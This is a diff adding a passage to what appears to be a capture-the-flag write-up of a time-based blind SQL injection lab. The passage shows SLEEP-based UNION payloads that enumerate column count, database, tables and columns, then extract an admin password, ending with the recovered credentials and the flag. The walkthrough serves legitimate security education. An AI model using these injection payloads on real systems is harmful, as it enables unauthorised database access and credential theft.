@@ -220,7 +220,73 @@ Successfully authenticated using the recovered credentials
 
 **Extract credentials using Response Timing**
 
+Introduced to a home page, complete with a timer and Referrer HTTP header injection point 
 
+![Home-Page](Images/sqli4-home.jpeg)
+
+---
+#### Find Column Count 
+
+Enumerated column count using the sleep operator 
+
+```SQL
+admin123' UNION SELECT SLEEP(5),2;--
+```
+
+![Column-Count](Images/sqli4-columncount.jpeg)
+
+
+
+#### Get the database name 
+
+Enumerate database character by character 
+
+![db-enum](Images/sqli4-dbenum.jpeg)
+
+Confirmed name of database -- `sqli_four`
+
+![db-confirm](Images/sqli4-dbconfirm.jpeg)
+
+
+#### Enumerate Tables and Columns 
+
+Enumerated the tables character by character using the LIKE operator 
+
+```SQL
+admin123' UNION SELECT SLEEP(5),2 FROM information_schema.tables WHERE table_schema='sqli_four' AND table_name LIKE '%';--
+```
+
+![table-enum](Images/sqli4-tableenum.jpeg)
+
+![table-confirmed](Images/sqli4-tableconfirm.jpeg)
+
+- Found table `users`
+
+Repeated the same enumeration process for columns 
+
+- Found columns `username` and `password`
+
+
+#### Extract the admin password 
+
+Iterated through and found the admin password Using the previously enumerated information 
+
+![password-enum](Images/sqli4-passenum.jpeg)
+
+```SQL
+admin123' UNION SELECT SLEEP(3),2 FROM users where username='admin' AND password LIKE '%';--
+```
+![password-enum](Images/sqli4-passconfirm.jpeg)
+
+Confirmed 
+
+- Username: Admin
+- Password: 4961
+
+
+#### **Capture Flag**
+
+![Flag](Images/sqli4-flag.jpeg)
 
 
 
